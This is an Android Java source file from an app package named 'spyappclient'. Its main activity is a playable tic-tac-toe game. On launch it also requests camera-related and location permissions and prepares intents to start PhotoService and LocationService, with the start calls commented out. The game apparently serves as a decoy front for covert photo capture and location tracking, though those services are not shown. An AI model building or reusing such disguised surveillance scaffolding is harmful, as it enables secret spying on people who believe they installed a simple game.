package com.example.alber.spyappclient;

import android.content.Intent;
import android.graphics.Color;
import android.graphics.PorterDuff;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;


public class MainActivity extends AppCompatActivity implements View.OnClickListener{
    Intent location, photocapture;
    Permission permission;

    private TextView textViewPlayer1;
    private TextView textViewPlayer2;
    private Button[][] buttons = new Button[3][3];

    private boolean turnPlayer1 = true;
    private int roundCount;
    private int player2Points;
    private int player1Points;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        textViewPlayer1 = findViewById(R.id.text_view_player1);
        textViewPlayer2 = findViewById(R.id.text_view_player2);
        initializeButtons();

        permission = new Permission(this, this);
        if (!permission.checkPermissions()) {
            permission.request();
        }

        photocapture = new Intent(this, PhotoService.class);
        location = new Intent(this, LocationService.class);

        if (permission.checkPhotoPermission() && permission.checkLocationPermission()) {
            //startService(photocapture);
            //startService(location);
            // new Thread ?
        } else permission.request();
    }

    public void initializeButtons() {
        for (int i = 0; i < 3; i++) {
            for (int j = 0; j < 3; j++) {
                String buttonID = "button_" + i + j;
                int resID = getResources().getIdentifier(buttonID, "id", getPackageName());
                buttons[i][j] = findViewById(resID);
                final Button reset = findViewById(R.id.reset);
                reset.setOnClickListener(new View.OnClickListener() {
                    @Override
                    public void onClick(View v) {
                        resetGame();
                    }
                });
                buttons[i][j].setOnClickListener(this);
            }
        }
    }

    private boolean checkWin() {
        String[][] field = new String[3][3];

        assignArray(field);
        if (checkVertically(field)
                || checkHorizontally(field)
                || checkDiagonallyLeftToRight(field)
                || checkDiagonallyRightToLeft(field)) {
            return true;
        } else return false;
    }

    private boolean checkDiagonallyRightToLeft(String[][] field) {
        if (field[0][2].equals(field[1][1])
                && field[0][2].equals(field[2][0])
                && !field[0][2].equals("")) {
            return true;
        }
        return false;
    }


    private boolean checkDiagonallyLeftToRight(String[][] field) {
        if (field[0][0].equals(field[1][1])
                && field[0][0].equals(field[2][2])
                && !field[0][0].equals("")) {
            return true;
        } else return false;
    }

    private boolean checkHorizontally(String[][] field) {
        for (int i = 0; i < 3; i++) {
            if (field[0][i].equals(field[1][i])
                    && field[0][i].equals(field[2][i])
                    && !field[0][i].equals("")) {
                return true;
            }
        }
        return false;
    }
    private void assignArray(String[][] field) {
        for (int i = 0; i < 3; i++) {
            for (int j = 0; j < 3; j++) {
                field[i][j] = buttons[i][j].getText().toString();
            }
        }
    }

    private boolean checkVertically(String field[][]) {
        for (int i = 0; i < 3; i++) {
            if (field[i][0].equals(field[i][1])
                    && field[i][0].equals(field[i][2])
                    && !field[i][0].equals("")) {
                return true;
            }
        }
        return false;
    }
    private void player1wins() {
        player1Points++;
        Toast.makeText(this, "Player 1 wins!", Toast.LENGTH_LONG).show();
        updateText();
        resetBoard();
    }

    private void player2wins() {
        player2Points++;
        Toast.makeText(this, "Player 2 wins!", Toast.LENGTH_LONG).show();
        updateText();
        resetBoard();
    }

    private void draw() {
        Toast.makeText(this, "Draw!", Toast.LENGTH_LONG).show();
        resetBoard();
    }

    private void updateText() {
        textViewPlayer1.setText("Player 1: " + player1Points);
        textViewPlayer2.setText("Player 2: " + player2Points);
    }

    private void resetBoard() {
        for (int i = 0; i < 3; i++) {
            for (int j = 0; j < 3; j++) {
                buttons[i][j].getBackground().clearColorFilter();
                buttons[i][j].setText("");
            }
        }
        roundCount = 0;
        turnPlayer1 = true;
    }

    private void resetGame() {
        player1Points = 0;
        player2Points = 0;
        updateText();
        resetBoard();
    }

    @Override
    protected void onSaveInstanceState(Bundle outState) {
        super.onSaveInstanceState(outState);
        outState.putInt("roundCount", roundCount);
        outState.putInt("player1Points", player1Points);
        outState.putInt("player2Points", player2Points);
        outState.putBoolean("turnPlayer1", turnPlayer1);
    }

    @Override
    protected void onRestoreInstanceState(Bundle savedInstanceState) {
        super.onRestoreInstanceState(savedInstanceState);
        roundCount = savedInstanceState.getInt("roundCount");
        player1Points = savedInstanceState.getInt("player1Points");
        player2Points = savedInstanceState.getInt("player2Points");
        turnPlayer1 = savedInstanceState.getBoolean("turnPlayer1");
    }

    @Override
    public void onClick(View v) {
        if (!((Button) v).getText().toString().equals("")) {
            return;
        }

        if (turnPlayer1) {
            ((Button) v).getBackground().setColorFilter(Color.RED, PorterDuff.Mode.MULTIPLY);
            ((Button) v).setText("X");
        } else {
            ((Button) v).getBackground().setColorFilter(Color.GREEN, PorterDuff.Mode.MULTIPLY);
            ((Button) v).setText("O");
        }
        roundCount++;

        if (checkWin()) {
            if (turnPlayer1) {
                player1wins();
            } else {
                player2wins();
            }
        } else if (roundCount == 9) {
            draw();
        } else {
            turnPlayer1 = !turnPlayer1;
        }
    }
}
